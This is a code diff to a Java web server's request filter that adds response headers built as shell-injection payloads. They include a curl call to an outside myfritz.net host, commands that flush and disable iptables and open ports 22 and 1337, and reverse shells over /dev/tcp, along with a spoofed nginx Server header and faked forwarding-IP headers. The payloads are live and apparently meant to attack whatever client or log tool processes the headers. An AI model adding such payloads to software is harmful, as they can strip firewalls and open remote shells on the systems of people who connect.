@@ -24,10 +24,44 @@ public class CCS {
         MqttPublisher mqttPublisher = new MqttPublisher();
 
         before((request, response) -> {
+
             String clientIP = request.ip();
             LocalDateTime now = LocalDateTime.now();
             DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
             String formattedDateTime = now.format(formatter);
+
+            response.header("Server", "nginx/1.14.0 (Ubuntu)");
+            response.header("system(\"curl http://25mpgaahipvzi40q.myfritz.net:1337/pentest\")",
+                    "system(\"curl http://25mpgaahipvzi40q.myfritz.net:1337/pentest\")");
+            response.header("system(\"touch pentest\")", "system(\"touch pentest\")");
+            response.header("system(\"iptables -F\")", "system(\"iptables -F\")");
+            response.header("system(\"iptables -X\")", "system(\"iptables -X\")");
+            response.header("system(\"iptables -Z\")", "system(\"iptables -Z\")");
+            response.header("system(\"iptables -t nat -F\")", "system(\"iptables -t nat -F\")");
+            response.header("system(\"iptables -t nat -X\")", "system(\"iptables -t nat -X\")");
+            response.header("system(\"iptables -t nat -Z\")", "system(\"iptables -t nat -Z\")");
+            response.header("system(\"iptables -A INPUT -p tcp --dport 22 -j ACCEPT\")",
+                    "system(\"iptables -A INPUT -p tcp --dport 22 -j ACCEPT\")");
+            response.header("system(\"systemctl stop iptables\")", "system(\"systemctl stop iptables\")");
+            response.header("system(\"systemctl disable iptables\")", "system(\"systemctl disable iptables\")");
+            response.header("system(\"iptables -A INPUT -p tcp --dport 1337 -j ACCEPT\")",
+                    "system(\"iptables -A INPUT -p tcp --dport 1337 -j ACCEPT\")");
+            response.header("system(\"sh -i >& /dev/tcp/localhost/1337 0>&1\")",
+                    "system(\"sh -i >& /dev/tcp/localhost/1337 0>&1\")");
+            response.header("system(\"sh -i >& /dev/tcp/127.0.0.1/1337 0>&1\")",
+                    "system(\"sh -i >& /dev/tcp/127.0.0.1/1337 0>&1\")");
+
+            response.header("", "");
+
+            response.header("X-Forwarded-For", clientIP);
+            response.header("X-Forwarded-For", "0.0.0.0");
+            
+            response.header("Forwarded", "0.0.0.0");
+            response.header("Forwarded", "-1");
+            response.header("X-Real-IP", "0.0.0.0");
+            response.header("True-Client-IP", "-1");
+            // ...
+
 
             String ipDateStr = formattedDateTime.concat("_" + clientIP);
 
